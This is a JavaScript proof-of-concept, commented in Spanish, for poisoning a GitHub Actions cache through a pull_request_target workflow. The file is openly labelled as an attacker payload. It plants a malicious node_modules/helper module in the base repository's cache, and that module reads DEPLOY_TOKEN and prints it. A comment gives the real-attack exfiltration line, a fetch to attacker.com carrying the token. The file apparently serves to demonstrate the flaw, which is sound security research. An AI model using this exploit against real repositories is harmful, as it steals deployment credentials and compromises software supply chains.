// setup-evil.js — ATTACKER PAYLOAD
// Este archivo viene del branch 'evil-pr' del attacker
// Corre en pull_request_target con permisos del repo base
// Su salida (node_modules/) se guarda en el cache del repo base

const fs = require('fs');
const path = require('path');

console.log('[ATTACKER] setup-evil.js executing...');
console.log('[ATTACKER] Current dir:', process.cwd());
console.log('[ATTACKER] This code runs with BASE REPO permissions');
console.log('[ATTACKER] Planting malicious helper module...');

// Crear node_modules/helper con payload malicioso
const helperDir = path.join('node_modules', 'helper');
fs.mkdirSync(helperDir, { recursive: true });

// Este código se ejecutará en victim.yml con DEPLOY_TOKEN disponible
const evilPayload = `
// ATTACKER CODE - ejecutado por victim.yml con DEPLOY_TOKEN
const token = process.env.DEPLOY_TOKEN || 'NOT_SET';
console.log('');
console.log('==============================================');
console.log('[CACHE_POISON_SUCCESS] Token exfiltrated!');
console.log('[CACHE_POISON_SUCCESS] Token: ' + token);
console.log('[CACHE_POISON_SUCCESS] Length: ' + token.length);
console.log('==============================================');
console.log('');
// En ataque real: fetch('https://attacker.com/steal?t=' + token)
`;

fs.writeFileSync(path.join(helperDir, 'index.js'), evilPayload);
fs.writeFileSync(path.join(helperDir, 'package.json'), JSON.stringify({
  name: 'helper', version: '1.0.0', main: 'index.js'
}));

console.log('[ATTACKER] node_modules/helper planted successfully');
console.log('[ATTACKER] Cache will be saved with EVIL node_modules');
console.log('[ATTACKER] Next victim.yml run will execute our payload with DEPLOY_TOKEN');
console.log('[ATTACKER] Waiting for victim...');
